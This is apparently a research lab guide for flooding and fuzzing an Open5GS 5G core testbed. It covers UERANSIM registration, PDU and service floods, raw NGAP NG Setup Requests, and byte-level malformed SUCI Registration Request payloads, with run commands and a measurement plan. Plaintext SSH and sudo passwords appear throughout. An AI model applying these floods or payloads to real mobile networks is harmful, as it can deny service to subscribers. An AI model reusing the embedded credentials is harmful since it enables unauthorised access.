# UERANSIM + Custom Raw Packet Attack — Integration & Manual Execution Guide

**Environment:** Open5GS 2.7.5 on `192.168.10.1` · Attacker `192.168.10.2`  
**PLMN:** MCC=999, MNC=70 · AMF NGAP port: 38412

---

## Part A — What Was Integrated and From Where

### Source Repositories

| Repo | What Was Used |
|------|--------------|
| `github.com/1915venu/5G-Registration-Attack` | Inspiration for UERANSIM attack modes (registration_flood, dereg_loop, pdu_flood, service_flood) and subscriber IMSI provisioning scheme |
| `github.com/aligungr/UERANSIM` | Built from source inside Docker container — provides `nr-gnb` and `nr-ue` C++ binaries |
| `github.com/mitshell/pycrate` | 5G NGAP/NAS ASN.1 encoder/decoder for custom packet scripts |
| `github.com/mitshell/CryptoMobile` | 5G NAS security primitives (MILENAGE, ECIES) |

### What Was Changed/Created for This Setup

The 1915venu repo targeted a different network (different IPs, different PLMN). Everything was adapted to match this setup:

| File | What Was Adapted |
|------|-----------------|
| `ueransim-attack/Dockerfile` | Builds UERANSIM from source; copies our attack scripts and configs |
| `ueransim-attack/scripts/entrypoint.sh` | Generates per-UE YAML configs using our IMSI range (`999700000000100`+), matches same subscriber pool as PacketRusher |
| `ueransim-attack/scripts/gnb.yaml` (template) | AMF IP=`192.168.10.1`, PLMN=999/70, TAC=1, SST=1 |
| `ueransim-attack/scripts/ue-template.yaml` | Per-UE template: K/OPc matching UDR, AMF IP, S-NSSAI SST=1 |
| `ueransim-attack/scripts/attack_*.sh` | Four attack mode scripts executed inside container |
| `ueransim-attack/run_ueransim_attack.py` | Orchestrator: SSH into attacker, launch containers, clock-skew-aware barrier, collect/parse logs |
| `custom-packet-scripts/send_ng_setup_req.py` | Raw NGAP NG Setup Request via pycrate + pysctp |
| `custom-packet-scripts/send_malformed_suci.py` | Raw NGAP Registration Requests with malformed SUCI (3 types) |

**Subscriber provisioning** (same as PacketRusher — both tools share the pool):
- 1000 subscribers in MongoDB/UDR
- IMSI: `imsi-999700000000100` through `imsi-999700000001099`
- MSIN format: `printf "%010d" $((100 + POD_INDEX * NUM_UE + ue_index))`
- K, OPc, AMF bytes: same values in `mongodb_provision.js`

**Clock skew:** Core node (.1) clock is ~54s ahead of attacker (.2). The UERANSIM orchestrator reads `date +%s` from the attacker (via SSH) when computing the barrier epoch — not from the core clock.

---

## Part B — Dependency Setup (One-Time)

### On Core Node (.1) — Custom Packet Scripts Only

```bash
# Install pycrate (NGAP/NAS ASN.1 encoder)
pip3 install pycrate --break-system-packages

# Install pysctp (raw SCTP socket)
pip3 install pysctp --break-system-packages

# Install CryptoMobile (5G NAS security — MILENAGE, ECIES)
pip3 install git+https://github.com/mitshell/CryptoMobile.git --break-system-packages

# Verify
python3 -c "from pycrate_asn1dir.NGAP import *; print('pycrate OK')"
python3 -c "import sctp; print('pysctp OK')"
```

> Note: Packages install to `~/.local/lib/python3.12/` (user site-packages). IDE linters may show "module not found" warnings — this is a false alarm, runtime works correctly.

### On Attacker Node (.2) — UERANSIM Docker Image (One-Time Build)

```bash
# SSH into attacker
ssh venu@192.168.10.2  # password: iit@123

# The orchestrator auto-builds when needed, but to build manually:
echo 'iit@123' | sudo -S docker build \
    -t ueransim-attack:latest \
    ~/16core-registration-attack/ueransim-attack/
# First build: ~5-10 minutes (compiles UERANSIM from source)
# Subsequent builds: fast (layer cache)

# Verify image exists
sudo docker images | grep ueransim-attack
```

---

## Part C — UERANSIM Attack Suite: Manual Execution

### Pre-Check Before Any Run

```bash
# On core (.1): verify all NFs are up
echo 'iitd123' | sudo -S docker compose ps
# All services should show "Up"

# Verify AMF is reachable from attacker
ssh venu@192.168.10.2 \
    "nc -zv 192.168.10.1 38412 2>&1"
# Expected: Connection to 192.168.10.1 38412 port [sctp/*] succeeded!
```

### Orchestrator (Recommended Way)

```bash
cd /home/venu/16core-registration-attack

# Mode 1: Registration flood — 3 pods × 10 UEs = 30 UEs
python3 ueransim-attack/run_ueransim_attack.py \
    --mode registration_flood --pods 3 --ues 10 --wait 60

# Mode 2: Deregistration loop — 5 cycles of register→deregister
python3 ueransim-attack/run_ueransim_attack.py \
    --mode dereg_loop --pods 3 --ues 10 --loops 5 --wait 120

# Mode 3: PDU session flood — 3 sessions per UE (hits SMF + UPF)
python3 ueransim-attack/run_ueransim_attack.py \
    --mode pdu_flood --pods 3 --ues 10 --pdu 3 --wait 90

# Mode 4: Service request flood — 5 idle→active cycles
python3 ueransim-attack/run_ueransim_attack.py \
    --mode service_flood --pods 3 --ues 10 --loops 5 --wait 120

# Force rebuild image (needed after source changes)
python3 ueransim-attack/run_ueransim_attack.py \
    --mode registration_flood --pods 3 --ues 10 --build
```

### Manual Single Container (Without Orchestrator)

```bash
# On attacker (.2):
ssh venu@192.168.10.2

TARGET=$(( $(date +%s) + 10 ))

echo 'iit@123' | sudo -S docker run -d \
    --name ueransim-pod0 \
    --network host --privileged --cap-add NET_ADMIN \
    -e POD_INDEX=0 \
    -e NUM_UE=10 \
    -e AMF_IP=192.168.10.1 \
    -e GNB_IP=192.168.10.2 \
    -e MODE=registration_flood \
    -e TARGET_TIME=$TARGET \
    ueransim-attack:latest

# Watch live logs
sudo docker logs -f ueransim-pod0

# Clean up
sudo docker rm -f ueransim-pod0
```

### Manual Multiple Containers (Synchronized Burst)

```bash
# On attacker (.2):
# Set barrier 15s from now — gives time to launch all containers
TARGET=$(( $(date +%s) + 15 ))

for POD in 0 1 2; do
    echo 'iit@123' | sudo -S docker run -d \
        --name ueransim-pod${POD} \
        --network host --privileged --cap-add NET_ADMIN \
        -e POD_INDEX=$POD \
        -e NUM_UE=10 \
        -e AMF_IP=192.168.10.1 \
        -e GNB_IP=192.168.10.2 \
        -e MODE=registration_flood \
        -e TARGET_TIME=$TARGET \
        ueransim-attack:latest
done

# Collect logs after ~60s
sleep 60
for POD in 0 1 2; do
    echo "=== Pod $POD ==="
    sudo docker logs ueransim-pod${POD} 2>&1 | grep -E "RESULTS|accept|reject|auth|BARRIER"
done

# Cleanup
for POD in 0 1 2; do sudo docker rm -f ueransim-pod${POD}; done
```

### Reading UERANSIM Results

```
=== registration_flood RESULTS (Pod 0) ===
  Auth Requests:       10
  Registration Accept: 10
  Registration Reject: 0
  Total UEs:           10
  Success Rate:        100%
==========================================
```

| Field | Meaning |
|-------|---------|
| Auth Requests | UEs that received NAS Authentication Request from AUSF (reached AMF) |
| Registration Accept | Successful NAS registrations |
| Registration Reject | AMF rejected the UE (auth failure, policy, etc.) |
| [BARRIER] REACHED | Timestamp when pod fired — spread across pods = sync window |

---

## Part D — Custom Raw Packet Scripts: Manual Execution

All custom packet scripts run **on the core node (.1)** directly (no SSH needed — they bind to 192.168.10.1 and connect to the local AMF).

```bash
cd /home/venu/16core-registration-attack/custom-packet-scripts
```

### Script 1: NG Setup Request (`send_ng_setup_req.py`)

Sends a raw NGAP NG Setup Request — the gNB registration handshake. Verifies the custom Python-to-AMF SCTP pipeline works.

```bash
python3 send_ng_setup_req.py
```

**Expected output:**
```
[*] Built NG Setup Request (67 bytes): 0015003f...
[*] SCTP connected to AMF 192.168.10.1:38412
[*] Sent NG Setup Request
[+] Received response (54 bytes): 201500...
[+] Decoded:
successfulOutcome : {
  procedureCode 21,
  value NGSetupResponse: {
    AMFName: "open5gs-amf0"
    ServedGUAMIList: { pLMNIdentity '99F907'H, ... }
    RelativeAMFCapacity: 255
```

**What this proves:** AMF accepts any correctly APER-encoded NGSetupRequest. No gNB authentication on the N2 interface.

**What to check if it fails:**
```bash
# Is AMF running?
echo 'iitd123' | sudo -S docker ps | grep amf

# Is port 38412 open?
ss -tlnp | grep 38412

# Check AMF logs for NG Setup attempt
echo 'iitd123' | sudo -S docker logs open5gs-amf 2>&1 | tail -20
```

---

### Script 2: Malformed SUCI Registration (`send_malformed_suci.py`)

Sends NAS Registration Requests with three types of malformed SUCI and measures AMF response time per type. This is the core performance impact measurement tool.

#### Run all three types once:
```bash
python3 send_malformed_suci.py
```

#### Run specific type, multiple times:
```bash
# Null scheme, non-existent subscriber — 10 requests
python3 send_malformed_suci.py --type null_nonexist --count 10

# Profile A with random ciphertext — 5 requests
python3 send_malformed_suci.py --type profile_a --count 5

# Truncated SUCI — 10 requests, quiet mode (summary only)
python3 send_malformed_suci.py --type truncated --count 10 --quiet

# All types, 5 each, summary only
python3 send_malformed_suci.py --type all --count 5 --quiet
```

#### Expected output (verbose mode):

```
[*] Connecting SCTP → AMF 192.168.10.1:38412 ...
[+] Connected
[*] NG Setup Request → Response 54B — gNB registered with AMF

  [null_nonexist]
  Null scheme, MSIN not in UDR     [full SBI round-trip: AMF→AUSF→UDM]
  NAS PDU (19B): 7e004171000d01 99f907000000 9999999999...
  NGAP InitialUEMessage (NB) → sending...
  AMF responded in XXX.Xms (YYB)
  Decoded:
  initiatingMessage : {
    procedureCode 46,
    value DownlinkNASTransport: { ... NAS Registration Reject inside ... }
  }

  [profile_a]
  Profile A, random ciphertext     [UDM ECIES fail + SBI round-trip]
  ...

  [truncated]
  Truncated SUCI (length mismatch) [NAS parse error, no SBI call]
  ...

======================================================================
  SUCI ATTACK — RESULTS SUMMARY
======================================================================
  Type                    N     Avg RTT   Responded
  ----------------------  ----  ----------  ----------
  null_nonexist              1    XXX.Xms       1/1
  profile_a                  1    XXX.Xms       1/1
  truncated                  1     XX.Xms       1/1
======================================================================

  RTT interpretation:
  null_nonexist ~fast  → AMF→AUSF→UDM round-trip overhead
  profile_a     ~fast  → same SBI cost as null (ECIES fail at UDM)
  truncated     fast   → no SBI, parse error only
  Difference null/profile_a vs truncated = SBI overhead per bad SUCI
```

#### What each AMF response means:

| Response | NGAP procedure | NAS message | Meaning |
|----------|---------------|-------------|---------|
| DownlinkNASTransport | proc=46 | Registration Reject | AMF processed SUCI, got SBI error, rejected |
| ErrorIndication | proc=15 | — | NGAP-level error (bad IE format) |
| No response (timeout) | — | — | AMF dropped the message silently (truncated SUCI variant) |

#### How to verify AMF is actually doing SBI calls:

```bash
# On core (.1) — watch AUSF logs while running the script
echo 'iitd123' | sudo -S docker logs -f open5gs-ausf 2>&1 | grep -E "SUCI|auth|error"

# Or UDM logs
echo 'iitd123' | sudo -S docker logs -f open5gs-udm 2>&1 | grep -E "SUCI|subscriber|404"
```

For `null_nonexist` and `profile_a` you should see UDM log entries (subscriber lookup attempts).  
For `truncated` you should see **no** UDM log entries (parse error before SBI call).

---

## Part E — SUCI Attack Types: Technical Detail

### What SUCI Is

SUCI (Subscription Concealed Identifier) is what a UE sends in its Registration Request instead of its IMSI. It conceals the IMSI using ECIES encryption so a passive observer cannot track the subscriber. The AMF cannot decode the SUCI itself — it sends it to AUSF → UDM for de-concealment.

```
UE Registration Request
  └─ NAS 5GS Mobile Identity = SUCI
       ├─ SUPI format: IMSI
       ├─ PLMN: MCC=999, MNC=70
       ├─ Routing indicator: 0000
       ├─ Protection scheme: null / Profile A / Profile B
       └─ Scheme output: plaintext MSIN (null) or ECIES ciphertext (A/B)

AMF receives SUCI → calls AUSF (SBI POST /ue-authentications)
AUSF → calls UDM (SBI POST /generate-auth-data with SUCI)
UDM → de-conceals SUCI → generates auth vectors
UDM → returns AV to AUSF → AUSF returns to AMF
AMF → sends NAS Authentication Request to UE
```

### The Three SUCI Types in `send_malformed_suci.py`

**Type 1: `null_nonexist` — Null scheme, non-existent MSIN**
```
SUCI content (13 bytes):
  01           — SUPI format=IMSI, identity type=SUCI
  99 F9 07     — PLMN (MCC=999, MNC=70)
  00 00        — Routing indicator: 0000
  00           — Protection scheme: null (0x00) — MSIN in plaintext BCD
  00           — HPLMN public key ID
  99 99 99 99 99  — MSIN "9999999999" in BCD — NOT in UDR
```
AMF de-conceal cost: trivial (null scheme = no decryption needed)  
AMF SBI cost: AUSF→UDM→UDR lookup → subscriber not found → 404 → error back to AMF  
Response: Registration Reject (cause: #3 illegal UE, or similar)

**Type 2: `profile_a` — ECIES Profile A with random ciphertext**
```
SUCI content (51 bytes):
  01           — SUPI format=IMSI, identity type=SUCI
  99 F9 07     — PLMN
  00 00        — Routing indicator
  01           — Protection scheme: Profile A (x25519 ECIES)
  00           — HPLMN public key ID
  [45 random bytes]  — scheme output:
                         32B ephemeral x25519 pubkey (random)
                          5B encrypted MSIN ciphertext (random)
                          8B MAC tag (random → MAC check fails)
```
AMF SBI cost: AUSF→UDM, UDM tries ECIES with its private key, MAC verification fails → error  
Response: Registration Reject

**Type 3: `truncated` — Length mismatch**
```
Sent bytes:
  00 14        — LV-E length field = 20 bytes
  01 99 F9     — only 3 bytes present
```
AMF NAS parser reads length=20, tries to consume 20 bytes of SUCI, only 3 available  
Result: NAS parse error → immediate Registration Reject or ErrorIndication  
No AUSF/UDM call → fastest AMF rejection path

---

## Part F — Performance Measurement Plan

The goal is to quantify the CPU/time overhead that malformed SUCI messages impose on the AMF, especially when mixed with legitimate registrations.

### Step 1 — Baseline (no attack)

Run 100 legitimate PacketRusher UEs, record:
- AMF CPU (from `docker stats open5gs-amf`)
- Registration success rate
- Average registration latency

### Step 2 — Under malformed SUCI flood

In parallel:
- Terminal A: run legitimate UEs via PacketRusher
- Terminal B: flood malformed SUCI via `send_malformed_suci.py`

```bash
# Terminal A (legitimate UEs):
cd /home/venu/16core-registration-attack
python3 run_attack.py

# Terminal B (SUCI flood, simultaneous):
cd custom-packet-scripts
python3 send_malformed_suci.py --type null_nonexist --count 100
```

### Step 3 — Compare

| Metric | Baseline | Under SUCI flood | Delta |
|--------|---------|-----------------|-------|
| Reg success rate | — | — | — |
| AMF CPU % | — | — | — |
| SBI latency | — | — | — |
| Avg RTT (legitimate) | — | — | — |

### AMF CPU Monitoring Command

```bash
# On core (.1) — watch AMF CPU every second
watch -n 1 "echo 'iitd123' | sudo -S docker stats --no-stream open5gs-amf open5gs-ausf open5gs-udm 2>/dev/null | grep -E 'NAME|open5gs'"
```

### AUSF/UDM Load Check

```bash
# Count SBI calls per second during flood
echo 'iitd123' | sudo -S docker logs open5gs-ausf 2>&1 | grep -c "auth" &
sleep 10
echo 'iitd123' | sudo -S docker logs open5gs-ausf 2>&1 | grep -c "auth"
# Difference / 10 = SBI calls per second
```

---

## Part G — Troubleshooting

| Symptom | Likely Cause | Fix |
|---------|-------------|-----|
| `[-] Error: Connection refused` | AMF not running | `sudo docker compose up -d` |
| `NG Setup: TIMEOUT` | AMF up but port blocked | Check `ss -tlnp | grep 38412` |
| `NG Setup Response` then `TIMEOUT` on InitialUEMessage | AMF dropped malformed NAS silently | Run with `--type truncated` first — should get fast reject |
| `decode error` on response | pycrate version mismatch | `pip3 install --upgrade pycrate --break-system-packages` |
| UERANSIM `Registration Accept: 0` | Wrong AMF IP or subscriber not in UDR | Verify `AMF_IP=192.168.10.1` and run `python3 mongodb_provision.js` |
| Docker build fails on attacker | Attacker has no internet | Pre-pull UERANSIM source manually or use cached image |
| All SUCI types show same RTT | AMF caching or AUSF/UDM already warm | Restart `open5gs-ausf` and `open5gs-udm` between runs |
